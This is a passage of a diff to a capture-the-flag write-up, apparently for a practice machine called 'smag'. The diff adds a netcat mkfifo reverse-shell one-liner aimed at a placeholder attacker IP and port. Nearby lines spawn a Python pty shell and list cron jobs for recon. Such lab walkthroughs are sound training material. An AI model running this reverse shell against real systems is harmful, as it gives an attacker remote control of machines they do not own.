@@ -48,6 +48,9 @@ After adding it  go to 'development.smag.thm/login.php'  you will get a prompt w
 Now u will get a prompt where u can use some commands.
  do some basic recon on that page.
 
+GET THE REVERSE SHELL BY THIS COMMAND
+'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP ADDR> <PORT> >/tmp/f'''
+
 i just make a spawn shell and the started performing some basic recon on that  '''python3 -c 'import pty; pty.spawn("/bin/bash")'  '''
 then i used a command to see the cronjobs for the users 
 ''' cat /etc/crontabs '''
